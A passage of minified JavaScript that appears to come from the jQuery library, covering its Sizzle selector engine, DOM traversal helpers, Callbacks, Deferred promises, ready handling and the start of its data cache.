                    de = { ID: new RegExp("^#(" + te + ")"), CLASS: new RegExp("^\\.(" + te + ")"), TAG: new RegExp("^(" + te + "|[*])"), ATTR: new RegExp("^" + ne), PSEUDO: new RegExp("^" + ie), CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + ee + "*(even|odd|(([+-]|)(\\d*)n|)" + ee + "*(?:([+-]|)" + ee + "*(\\d+)|))" + ee + "*\\)|)", "i"), bool: new RegExp("^(?:" + Q + ")$", "i"), needsContext: new RegExp("^" + ee + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + ee + "*((?:-\\d)?\\d*)" + ee + "*\\)|)(?=[^-]|$)", "i") },
                    fe = /^(?:input|select|textarea|button)$/i,
                    he = /^h\d$/i,
                    pe = /^[^{]+\{\s*\[native \w/,
                    be = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                    me = /[+~]/,
                    ge = new RegExp("\\\\([\\da-f]{1,6}" + ee + "?|(" + ee + ")|.)", "ig"),
                    ve = function(e, t, n) { var i = "0x" + t - 65536; return i !== i || n ? t : i < 0 ? String.fromCharCode(i + 65536) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320) },
                    ye = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
                    we = function(e, t) { return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e },
                    xe = function() { R() },
                    Se = f(function(e) { return !0 === e.disabled && ("form" in e || "label" in e) }, { dir: "parentNode", next: "legend" }); try { G.apply(Y = J.call(N.childNodes), N.childNodes), Y[N.childNodes.length].nodeType } catch (e) { G = { apply: Y.length ? function(e, t) { $.apply(e, J.call(t)) } : function(e, t) { for (var n = e.length, i = 0; e[n++] = t[i++];);
                            e.length = n - 1 } } } w = t.support = {}, _ = t.isXML = function(e) { var t = e && (e.ownerDocument || e).documentElement; return !!t && "HTML" !== t.nodeName }, R = t.setDocument = function(e) { var t, n, i = e ? e.ownerDocument || e : N; return i !== P && 9 === i.nodeType && i.documentElement ? (P = i, I = P.documentElement, D = !_(P), N !== P && (n = P.defaultView) && n.top !== n && (n.addEventListener ? n.addEventListener("unload", xe, !1) : n.attachEvent && n.attachEvent("onunload", xe)), w.attributes = r(function(e) { return e.className = "i", !e.getAttribute("className") }), w.getElementsByTagName = r(function(e) { return e.appendChild(P.createComment("")), !e.getElementsByTagName("*").length }), w.getElementsByClassName = pe.test(P.getElementsByClassName), w.getById = r(function(e) { return I.appendChild(e).id = L, !P.getElementsByName || !P.getElementsByName(L).length }), w.getById ? (x.filter.ID = function(e) { var t = e.replace(ge, ve); return function(e) { return e.getAttribute("id") === t } }, x.find.ID = function(e, t) { if (void 0 !== t.getElementById && D) { var n = t.getElementById(e); return n ? [n] : [] } }) : (x.filter.ID = function(e) { var t = e.replace(ge, ve); return function(e) { var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id"); return n && n.value === t } }, x.find.ID = function(e, t) { if (void 0 !== t.getElementById && D) { var n, i, r, o = t.getElementById(e); if (o) { if ((n = o.getAttributeNode("id")) && n.value === e) return [o]; for (r = t.getElementsByName(e), i = 0; o = r[i++];)
                                    if ((n = o.getAttributeNode("id")) && n.value === e) return [o] } return [] } }), x.find.TAG = w.getElementsByTagName ? function(e, t) { return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : w.qsa ? t.querySelectorAll(e) : void 0 } : function(e, t) { var n, i = [],
                            r = 0,
                            o = t.getElementsByTagName(e); if ("*" === e) { for (; n = o[r++];) 1 === n.nodeType && i.push(n); return i } return o }, x.find.CLASS = w.getElementsByClassName && function(e, t) { if (void 0 !== t.getElementsByClassName && D) return t.getElementsByClassName(e) }, j = [], O = [], (w.qsa = pe.test(P.querySelectorAll)) && (r(function(e) { I.appendChild(e).innerHTML = "<a id='" + L + "'></a><select id='" + L + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && O.push("[*^$]=" + ee + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || O.push("\\[" + ee + "*(?:value|" + Q + ")"), e.querySelectorAll("[id~=" + L + "-]").length || O.push("~="), e.querySelectorAll(":checked").length || O.push(":checked"), e.querySelectorAll("a#" + L + "+*").length || O.push(".#.+[+~]") }), r(function(e) { e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>"; var t = P.createElement("input");
                        t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && O.push("name" + ee + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && O.push(":enabled", ":disabled"), I.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && O.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), O.push(",.*:") })), (w.matchesSelector = pe.test(q = I.matches || I.webkitMatchesSelector || I.mozMatchesSelector || I.oMatchesSelector || I.msMatchesSelector)) && r(function(e) { w.disconnectedMatch = q.call(e, "*"), q.call(e, "[s!='']:x"), j.push("!=", ie) }), O = O.length && new RegExp(O.join("|")), j = j.length && new RegExp(j.join("|")), t = pe.test(I.compareDocumentPosition), B = t || pe.test(I.contains) ? function(e, t) { var n = 9 === e.nodeType ? e.documentElement : e,
                            i = t && t.parentNode; return e === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(i))) } : function(e, t) { if (t)
                            for (; t = t.parentNode;)
                                if (t === e) return !0; return !1 }, W = t ? function(e, t) { if (e === t) return M = !0, 0; var n = !e.compareDocumentPosition - !t.compareDocumentPosition; return n || (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1, 1 & n || !w.sortDetached && t.compareDocumentPosition(e) === n ? e === P || e.ownerDocument === N && B(N, e) ? -1 : t === P || t.ownerDocument === N && B(N, t) ? 1 : T ? Z(T, e) - Z(T, t) : 0 : 4 & n ? -1 : 1) } : function(e, t) { if (e === t) return M = !0, 0; var n, i = 0,
                            r = e.parentNode,
                            o = t.parentNode,
                            s = [e],
                            c = [t]; if (!r || !o) return e === P ? -1 : t === P ? 1 : r ? -1 : o ? 1 : T ? Z(T, e) - Z(T, t) : 0; if (r === o) return a(e, t); for (n = e; n = n.parentNode;) s.unshift(n); for (n = t; n = n.parentNode;) c.unshift(n); for (; s[i] === c[i];) i++; return i ? a(s[i], c[i]) : s[i] === N ? -1 : c[i] === N ? 1 : 0 }, P) : P }, t.matches = function(e, n) { return t(e, null, null, n) }, t.matchesSelector = function(e, n) { if ((e.ownerDocument || e) !== P && R(e), n = n.replace(ce, "='$1']"), w.matchesSelector && D && !V[n + " "] && (!j || !j.test(n)) && (!O || !O.test(n))) try { var i = q.call(e, n); if (i || w.disconnectedMatch || e.document && 11 !== e.document.nodeType) return i } catch (e) {}
                    return t(n, P, null, [e]).length > 0 }, t.contains = function(e, t) { return (e.ownerDocument || e) !== P && R(e), B(e, t) }, t.attr = function(e, t) {
                    (e.ownerDocument || e) !== P && R(e); var n = x.attrHandle[t.toLowerCase()],
                        i = n && K.call(x.attrHandle, t.toLowerCase()) ? n(e, t, !D) : void 0; return void 0 !== i ? i : w.attributes || !D ? e.getAttribute(t) : (i = e.getAttributeNode(t)) && i.specified ? i.value : null }, t.escape = function(e) { return (e + "").replace(ye, we) }, t.error = function(e) { throw new Error("Syntax error, unrecognized expression: " + e) }, t.uniqueSort = function(e) { var t, n = [],
                        i = 0,
                        r = 0; if (M = !w.detectDuplicates, T = !w.sortStable && e.slice(0), e.sort(W), M) { for (; t = e[r++];) t === e[r] && (i = n.push(r)); for (; i--;) e.splice(n[i], 1) } return T = null, e }, S = t.getText = function(e) { var t, n = "",
                        i = 0,
                        r = e.nodeType; if (r) { if (1 === r || 9 === r || 11 === r) { if ("string" == typeof e.textContent) return e.textContent; for (e = e.firstChild; e; e = e.nextSibling) n += S(e) } else if (3 === r || 4 === r) return e.nodeValue } else
                        for (; t = e[i++];) n += S(t); return n }, x = t.selectors = { cacheLength: 50, createPseudo: i, match: de, attrHandle: {}, find: {}, relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } }, preFilter: { ATTR: function(e) { return e[1] = e[1].replace(ge, ve), e[3] = (e[3] || e[4] || e[5] || "").replace(ge, ve), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4) }, CHILD: function(e) { return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || t.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && t.error(e[0]), e }, PSEUDO: function(e) { var t, n = !e[6] && e[2]; return de.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && ue.test(n) && (t = k(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3)) } }, filter: { TAG: function(e) { var t = e.replace(ge, ve).toLowerCase(); return "*" === e ? function() { return !0 } : function(e) { return e.nodeName && e.nodeName.toLowerCase() === t } }, CLASS: function(e) { var t = U[e + " "]; return t || (t = new RegExp("(^|" + ee + ")" + e + "(" + ee + "|$)")) && U(e, function(e) { return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "") }) }, ATTR: function(e, n, i) { return function(r) { var o = t.attr(r, e); return null == o ? "!=" === n : !n || (o += "", "=" === n ? o === i : "!=" === n ? o !== i : "^=" === n ? i && 0 === o.indexOf(i) : "*=" === n ? i && o.indexOf(i) > -1 : "$=" === n ? i && o.slice(-i.length) === i : "~=" === n ? (" " + o.replace(re, " ") + " ").indexOf(i) > -1 : "|=" === n && (o === i || o.slice(0, i.length + 1) === i + "-")) } }, CHILD: function(e, t, n, i, r) { var o = "nth" !== e.slice(0, 3),
                                a = "last" !== e.slice(-4),
                                s = "of-type" === t; return 1 === i && 0 === r ? function(e) { return !!e.parentNode } : function(t, n, c) { var u, l, d, f, h, p, b = o !== a ? "nextSibling" : "previousSibling",
                                    m = t.parentNode,
                                    g = s && t.nodeName.toLowerCase(),
                                    v = !c && !s,
                                    y = !1; if (m) { if (o) { for (; b;) { for (f = t; f = f[b];)
                                                if (s ? f.nodeName.toLowerCase() === g : 1 === f.nodeType) return !1;
                                            p = b = "only" === e && !p && "nextSibling" } return !0 } if (p = [a ? m.firstChild : m.lastChild], a && v) { for (f = m, d = f[L] || (f[L] = {}), l = d[f.uniqueID] || (d[f.uniqueID] = {}), u = l[e] || [], h = u[0] === F && u[1], y = h && u[2], f = h && m.childNodes[h]; f = ++h && f && f[b] || (y = h = 0) || p.pop();)
                                            if (1 === f.nodeType && ++y && f === t) { l[e] = [F, h, y]; break } } else if (v && (f = t, d = f[L] || (f[L] = {}), l = d[f.uniqueID] || (d[f.uniqueID] = {}), u = l[e] || [], h = u[0] === F && u[1], y = h), !1 === y)
                                        for (;
                                            (f = ++h && f && f[b] || (y = h = 0) || p.pop()) && ((s ? f.nodeName.toLowerCase() !== g : 1 !== f.nodeType) || !++y || (v && (d = f[L] || (f[L] = {}), l = d[f.uniqueID] || (d[f.uniqueID] = {}), l[e] = [F, y]), f !== t));); return (y -= r) === i || y % i == 0 && y / i >= 0 } } }, PSEUDO: function(e, n) { var r, o = x.pseudos[e] || x.setFilters[e.toLowerCase()] || t.error("unsupported pseudo: " + e); return o[L] ? o(n) : o.length > 1 ? (r = [e, e, "", n], x.setFilters.hasOwnProperty(e.toLowerCase()) ? i(function(e, t) { for (var i, r = o(e, n), a = r.length; a--;) i = Z(e, r[a]), e[i] = !(t[i] = r[a]) }) : function(e) { return o(e, 0, r) }) : o } }, pseudos: { not: i(function(e) { var t = [],
                                n = [],
                                r = C(e.replace(oe, "$1")); return r[L] ? i(function(e, t, n, i) { for (var o, a = r(e, null, i, []), s = e.length; s--;)(o = a[s]) && (e[s] = !(t[s] = o)) }) : function(e, i, o) { return t[0] = e, r(t, null, o, n), t[0] = null, !n.pop() } }), has: i(function(e) { return function(n) { return t(e, n).length > 0 } }), contains: i(function(e) { return e = e.replace(ge, ve),
                                function(t) { return (t.textContent || t.innerText || S(t)).indexOf(e) > -1 } }), lang: i(function(e) { return le.test(e || "") || t.error("unsupported lang: " + e), e = e.replace(ge, ve).toLowerCase(),
                                function(t) { var n;
                                    do { if (n = D ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-") } while ((t = t.parentNode) && 1 === t.nodeType); return !1 } }), target: function(t) { var n = e.location && e.location.hash; return n && n.slice(1) === t.id }, root: function(e) { return e === I }, focus: function(e) { return e === P.activeElement && (!P.hasFocus || P.hasFocus()) && !!(e.type || e.href || ~e.tabIndex) }, enabled: s(!1), disabled: s(!0), checked: function(e) { var t = e.nodeName.toLowerCase(); return "input" === t && !!e.checked || "option" === t && !!e.selected }, selected: function(e) { return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected }, empty: function(e) { for (e = e.firstChild; e; e = e.nextSibling)
                                if (e.nodeType < 6) return !1; return !0 }, parent: function(e) { return !x.pseudos.empty(e) }, header: function(e) { return he.test(e.nodeName) }, input: function(e) { return fe.test(e.nodeName) }, button: function(e) { var t = e.nodeName.toLowerCase(); return "input" === t && "button" === e.type || "button" === t }, text: function(e) { var t; return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase()) }, first: c(function() { return [0] }), last: c(function(e, t) { return [t - 1] }), eq: c(function(e, t, n) { return [n < 0 ? n + t : n] }), even: c(function(e, t) { for (var n = 0; n < t; n += 2) e.push(n); return e }), odd: c(function(e, t) { for (var n = 1; n < t; n += 2) e.push(n); return e }), lt: c(function(e, t, n) { for (var i = n < 0 ? n + t : n; --i >= 0;) e.push(i); return e }), gt: c(function(e, t, n) { for (var i = n < 0 ? n + t : n; ++i < t;) e.push(i); return e }) } }, x.pseudos.nth = x.pseudos.eq; for (y in { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }) x.pseudos[y] = function(e) { return function(t) { return "input" === t.nodeName.toLowerCase() && t.type === e } }(y); for (y in { submit: !0, reset: !0 }) x.pseudos[y] = function(e) { return function(t) { var n = t.nodeName.toLowerCase(); return ("input" === n || "button" === n) && t.type === e } }(y); return l.prototype = x.filters = x.pseudos, x.setFilters = new l, k = t.tokenize = function(e, n) { var i, r, o, a, s, c, u, l = H[e + " "]; if (l) return n ? 0 : l.slice(0); for (s = e, c = [], u = x.preFilter; s;) { i && !(r = ae.exec(s)) || (r && (s = s.slice(r[0].length) || s), c.push(o = [])), i = !1, (r = se.exec(s)) && (i = r.shift(), o.push({ value: i, type: r[0].replace(oe, " ") }), s = s.slice(i.length)); for (a in x.filter) !(r = de[a].exec(s)) || u[a] && !(r = u[a](r)) || (i = r.shift(), o.push({ value: i, type: a, matches: r }), s = s.slice(i.length)); if (!i) break } return n ? s.length : s ? t.error(e) : H(e, c).slice(0) }, C = t.compile = function(e, t) { var n, i = [],
                        r = [],
                        o = V[e + " "]; if (!o) { for (t || (t = k(e)), n = t.length; n--;) o = g(t[n]), o[L] ? i.push(o) : r.push(o);
                        o = V(e, v(r, i)), o.selector = e } return o }, A = t.select = function(e, t, n, i) { var r, o, a, s, c, l = "function" == typeof e && e,
                        f = !i && k(e = l.selector || e); if (n = n || [], 1 === f.length) { if (o = f[0] = f[0].slice(0), o.length > 2 && "ID" === (a = o[0]).type && 9 === t.nodeType && D && x.relative[o[1].type]) { if (!(t = (x.find.ID(a.matches[0].replace(ge, ve), t) || [])[0])) return n;
                            l && (t = t.parentNode), e = e.slice(o.shift().value.length) } for (r = de.needsContext.test(e) ? 0 : o.length; r-- && (a = o[r], !x.relative[s = a.type]);)
                            if ((c = x.find[s]) && (i = c(a.matches[0].replace(ge, ve), me.test(o[0].type) && u(t.parentNode) || t))) { if (o.splice(r, 1), !(e = i.length && d(o))) return G.apply(n, i), n; break } } return (l || C(e, f))(i, t, !D, n, !t || me.test(e) && u(t.parentNode) || t), n }, w.sortStable = L.split("").sort(W).join("") === L, w.detectDuplicates = !!M, R(), w.sortDetached = r(function(e) { return 1 & e.compareDocumentPosition(P.createElement("fieldset")) }), r(function(e) { return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href") }) || o("type|href|height|width", function(e, t, n) { if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2) }), w.attributes && r(function(e) { return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value") }) || o("value", function(e, t, n) { if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue }), r(function(e) { return null == e.getAttribute("disabled") }) || o(Q, function(e, t, n) { var i; if (!n) return !0 === e[t] ? t.toLowerCase() : (i = e.getAttributeNode(t)) && i.specified ? i.value : null }), t }(n);
        Ce.find = Ee, Ce.expr = Ee.selectors, Ce.expr[":"] = Ce.expr.pseudos, Ce.uniqueSort = Ce.unique = Ee.uniqueSort, Ce.text = Ee.getText, Ce.isXMLDoc = Ee.isXML, Ce.contains = Ee.contains, Ce.escapeSelector = Ee.escape;
        var Te = function(e, t, n) { for (var i = [], r = void 0 !== n;
                    (e = e[t]) && 9 !== e.nodeType;)
                    if (1 === e.nodeType) { if (r && Ce(e).is(n)) break;
                        i.push(e) }
                return i },
            Me = function(e, t) { for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e); return n },
            Re = Ce.expr.match.needsContext,
            Pe = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
        Ce.filter = function(e, t, n) { var i = t[0]; return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === i.nodeType ? Ce.find.matchesSelector(i, e) ? [i] : [] : Ce.find.matches(e, Ce.grep(t, function(e) { return 1 === e.nodeType })) }, Ce.fn.extend({ find: function(e) { var t, n, i = this.length,
                    r = this; if ("string" != typeof e) return this.pushStack(Ce(e).filter(function() { for (t = 0; t < i; t++)
                        if (Ce.contains(r[t], this)) return !0 })); for (n = this.pushStack([]), t = 0; t < i; t++) Ce.find(e, r[t], n); return i > 1 ? Ce.uniqueSort(n) : n }, filter: function(e) { return this.pushStack(l(this, e || [], !1)) }, not: function(e) { return this.pushStack(l(this, e || [], !0)) }, is: function(e) { return !!l(this, "string" == typeof e && Re.test(e) ? Ce(e) : e || [], !1).length } });
        var Ie, De = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
        (Ce.fn.init = function(e, t, n) { var i, r; if (!e) return this; if (n = n || Ie, "string" == typeof e) { if (!(i = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : De.exec(e)) || !i[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e); if (i[1]) { if (t = t instanceof Ce ? t[0] : t, Ce.merge(this, Ce.parseHTML(i[1], t && t.nodeType ? t.ownerDocument || t : le, !0)), Pe.test(i[1]) && Ce.isPlainObject(t))
                        for (i in t) Se(this[i]) ? this[i](t[i]) : this.attr(i, t[i]); return this } return r = le.getElementById(i[2]), r && (this[0] = r, this.length = 1), this } return e.nodeType ? (this[0] = e, this.length = 1, this) : Se(e) ? void 0 !== n.ready ? n.ready(e) : e(Ce) : Ce.makeArray(e, this) }).prototype = Ce.fn, Ie = Ce(le);
        var Oe = /^(?:parents|prev(?:Until|All))/,
            je = { children: !0, contents: !0, next: !0, prev: !0 };
        Ce.fn.extend({ has: function(e) { var t = Ce(e, this),
                    n = t.length; return this.filter(function() { for (var e = 0; e < n; e++)
                        if (Ce.contains(this, t[e])) return !0 }) }, closest: function(e, t) { var n, i = 0,
                    r = this.length,
                    o = [],
                    a = "string" != typeof e && Ce(e); if (!Re.test(e))
                    for (; i < r; i++)
                        for (n = this[i]; n && n !== t; n = n.parentNode)
                            if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && Ce.find.matchesSelector(n, e))) { o.push(n); break }
                return this.pushStack(o.length > 1 ? Ce.uniqueSort(o) : o) }, index: function(e) { return e ? "string" == typeof e ? be.call(Ce(e), this[0]) : be.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1 }, add: function(e, t) { return this.pushStack(Ce.uniqueSort(Ce.merge(this.get(), Ce(e, t)))) }, addBack: function(e) { return this.add(null == e ? this.prevObject : this.prevObject.filter(e)) } }), Ce.each({ parent: function(e) { var t = e.parentNode; return t && 11 !== t.nodeType ? t : null }, parents: function(e) { return Te(e, "parentNode") }, parentsUntil: function(e, t, n) { return Te(e, "parentNode", n) }, next: function(e) { return d(e, "nextSibling") }, prev: function(e) { return d(e, "previousSibling") }, nextAll: function(e) { return Te(e, "nextSibling") }, prevAll: function(e) { return Te(e, "previousSibling") }, nextUntil: function(e, t, n) { return Te(e, "nextSibling", n) }, prevUntil: function(e, t, n) { return Te(e, "previousSibling", n) }, siblings: function(e) { return Me((e.parentNode || {}).firstChild, e) }, children: function(e) { return Me(e.firstChild) }, contents: function(e) { return u(e, "iframe") ? e.contentDocument : (u(e, "template") && (e = e.content || e), Ce.merge([], e.childNodes)) } }, function(e, t) { Ce.fn[e] = function(n, i) { var r = Ce.map(this, t, n); return "Until" !== e.slice(-5) && (i = n), i && "string" == typeof i && (r = Ce.filter(i, r)), this.length > 1 && (je[e] || Ce.uniqueSort(r), Oe.test(e) && r.reverse()), this.pushStack(r) } });
        var qe = /[^\x20\t\r\n\f]+/g;
        Ce.Callbacks = function(e) { e = "string" == typeof e ? f(e) : Ce.extend({}, e); var t, n, i, r, o = [],
                a = [],
                c = -1,
                u = function() { for (r = r || e.once, i = t = !0; a.length; c = -1)
                        for (n = a.shift(); ++c < o.length;) !1 === o[c].apply(n[0], n[1]) && e.stopOnFalse && (c = o.length, n = !1);
                    e.memory || (n = !1), t = !1, r && (o = n ? [] : "") },
                l = { add: function() { return o && (n && !t && (c = o.length - 1, a.push(n)), function t(n) { Ce.each(n, function(n, i) { Se(i) ? e.unique && l.has(i) || o.push(i) : i && i.length && "string" !== s(i) && t(i) }) }(arguments), n && !t && u()), this }, remove: function() { return Ce.each(arguments, function(e, t) { for (var n;
                                (n = Ce.inArray(t, o, n)) > -1;) o.splice(n, 1), n <= c && c-- }), this }, has: function(e) { return e ? Ce.inArray(e, o) > -1 : o.length > 0 }, empty: function() { return o && (o = []), this }, disable: function() { return r = a = [], o = n = "", this }, disabled: function() { return !o }, lock: function() { return r = a = [], n || t || (o = n = ""), this }, locked: function() { return !!r }, fireWith: function(e, n) { return r || (n = n || [], n = [e, n.slice ? n.slice() : n], a.push(n), t || u()), this }, fire: function() { return l.fireWith(this, arguments), this }, fired: function() { return !!i } }; return l }, Ce.extend({ Deferred: function(e) { var t = [
                        ["notify", "progress", Ce.Callbacks("memory"), Ce.Callbacks("memory"), 2],
                        ["resolve", "done", Ce.Callbacks("once memory"), Ce.Callbacks("once memory"), 0, "resolved"],
                        ["reject", "fail", Ce.Callbacks("once memory"), Ce.Callbacks("once memory"), 1, "rejected"]
                    ],
                    i = "pending",
                    r = { state: function() { return i }, always: function() { return o.done(arguments).fail(arguments), this }, catch: function(e) { return r.then(null, e) }, pipe: function() { var e = arguments; return Ce.Deferred(function(n) { Ce.each(t, function(t, i) { var r = Se(e[i[4]]) && e[i[4]];
                                    o[i[1]](function() { var e = r && r.apply(this, arguments);
                                        e && Se(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[i[0] + "With"](this, r ? [e] : arguments) }) }), e = null }).promise() }, then: function(e, i, r) {
                            function o(e, t, i, r) { return function() { var s = this,
                                        c = arguments,
                                        u = function() { var n, u; if (!(e < a)) { if ((n = i.apply(s, c)) === t.promise()) throw new TypeError("Thenable self-resolution");
                                                u = n && ("object" == typeof n || "function" == typeof n) && n.then, Se(u) ? r ? u.call(n, o(a, t, h, r), o(a, t, p, r)) : (a++, u.call(n, o(a, t, h, r), o(a, t, p, r), o(a, t, h, t.notifyWith))) : (i !== h && (s = void 0, c = [n]), (r || t.resolveWith)(s, c)) } },
                                        l = r ? u : function() { try { u() } catch (n) { Ce.Deferred.exceptionHook && Ce.Deferred.exceptionHook(n, l.stackTrace), e + 1 >= a && (i !== p && (s = void 0, c = [n]), t.rejectWith(s, c)) } };
                                    e ? l() : (Ce.Deferred.getStackHook && (l.stackTrace = Ce.Deferred.getStackHook()), n.setTimeout(l)) } } var a = 0; return Ce.Deferred(function(n) { t[0][3].add(o(0, n, Se(r) ? r : h, n.notifyWith)), t[1][3].add(o(0, n, Se(e) ? e : h)), t[2][3].add(o(0, n, Se(i) ? i : p)) }).promise() }, promise: function(e) { return null != e ? Ce.extend(e, r) : r } },
                    o = {}; return Ce.each(t, function(e, n) { var a = n[2],
                        s = n[5];
                    r[n[1]] = a.add, s && a.add(function() { i = s }, t[3 - e][2].disable, t[3 - e][3].disable, t[0][2].lock, t[0][3].lock), a.add(n[3].fire), o[n[0]] = function() { return o[n[0] + "With"](this === o ? void 0 : this, arguments), this }, o[n[0] + "With"] = a.fireWith }), r.promise(o), e && e.call(o, o), o }, when: function(e) { var t = arguments.length,
                    n = t,
                    i = Array(n),
                    r = fe.call(arguments),
                    o = Ce.Deferred(),
                    a = function(e) { return function(n) { i[e] = this, r[e] = arguments.length > 1 ? fe.call(arguments) : n, --t || o.resolveWith(i, r) } }; if (t <= 1 && (b(e, o.done(a(n)).resolve, o.reject, !t), "pending" === o.state() || Se(r[n] && r[n].then))) return o.then(); for (; n--;) b(r[n], a(n), o.reject); return o.promise() } });
        var Be = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
        Ce.Deferred.exceptionHook = function(e, t) { n.console && n.console.warn && e && Be.test(e.name) && n.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t) }, Ce.readyException = function(e) { n.setTimeout(function() { throw e }) };
        var Le = Ce.Deferred();
        Ce.fn.ready = function(e) { return Le.then(e).catch(function(e) { Ce.readyException(e) }), this }, Ce.extend({ isReady: !1, readyWait: 1, ready: function(e) {
                (!0 === e ? --Ce.readyWait : Ce.isReady) || (Ce.isReady = !0, !0 !== e && --Ce.readyWait > 0 || Le.resolveWith(le, [Ce])) } }), Ce.ready.then = Le.then, "complete" === le.readyState || "loading" !== le.readyState && !le.documentElement.doScroll ? n.setTimeout(Ce.ready) : (le.addEventListener("DOMContentLoaded", m), n.addEventListener("load", m));
        var Ne = function(e, t, n, i, r, o, a) { var c = 0,
                    u = e.length,
                    l = null == n; if ("object" === s(n)) { r = !0; for (c in n) Ne(e, t, c, n[c], !0, o, a) } else if (void 0 !== i && (r = !0, Se(i) || (a = !0), l && (a ? (t.call(e, i), t = null) : (l = t, t = function(e, t, n) { return l.call(Ce(e), n) })), t))
                    for (; c < u; c++) t(e[c], n, a ? i : i.call(e[c], c, t(e[c], n))); return r ? e : l ? t.call(e) : u ? t(e[0], n) : o },
            Fe = /^-ms-/,
            ze = /-([a-z])/g,
            Ue = function(e) { return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType };
        y.uid = 1, y.prototype = { cache: function(e) { var t = e[this.expando]; return t || (t = {}, Ue(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, { value: t, configurable: !0 }))), t }, set: function(e, t, n) { var i, r = this.cache(e); if ("string" == typeof t) r[v(t)] = n;
                else
                    for (i in t) r[v(i)] = t[i]; return r }, get: function(e, t) { return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][v(t)] }, access: function(e, t, n) { return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t) }, remove: function(e, t) { var n, i = e[this.expando]; if (void 0 !== i) { if (void 0 !== t) { Array.isArray(t) ? t = t.map(v) : (t = v(t), t = t in i ? [t] : t.match(qe) || []), n = t.length; for (; n--;) delete i[t[n]] }(void 0 === t || Ce.isEmptyObject(i)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando]) } }, hasData: function(e) { var t = e[this.expando]; return void 0 !== t && !Ce.isEmptyObject(t) } };
        var He = new y,
            Ve = new y,
            We = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
            Ke = /[A-Z]/g;
        Ce.extend({ hasData: function(e) { return Ve.hasData(e) || He.hasData(e) }, data: function(e, t, n) { return Ve.access(e, t, n) }, removeData: function(e, t) { Ve.remove(e, t) }, _data: function(e, t, n) { return He.access(e, t, n) }, _removeData: function(e, t) { He.remove(e, t) } }), Ce.fn.extend({ data: function(e, t) { var n, i, r, o = this[0],
                    a = o && o.attributes; if (void 0 === e) { if (this.length && (r = Ve.get(o), 1 === o.nodeType && !He.get(o, "hasDataAttrs"))) { for (n = a.length; n--;) a[n] && (i = a[n].name, 0 === i.indexOf("data-") && (i = v(i.slice(5)), x(o, i, r[i])));
